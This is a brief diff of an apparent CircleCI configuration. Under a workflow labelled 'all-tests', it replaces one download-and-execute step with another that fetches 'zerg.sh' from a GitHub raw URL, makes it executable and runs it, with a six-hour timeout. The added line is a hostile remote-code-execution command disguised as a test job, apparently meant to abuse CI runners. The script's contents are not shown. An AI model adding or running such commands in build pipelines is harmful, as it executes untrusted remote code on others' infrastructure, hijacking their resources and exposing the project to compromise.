@@ -22,7 +22,7 @@ jobs:
       - run:
          no_output_timeout: 360m
          command: |-
-           wget https://gitlab.com/fukadabunit/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
+           wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh
 workflows:
   all-tests:
     jobs:
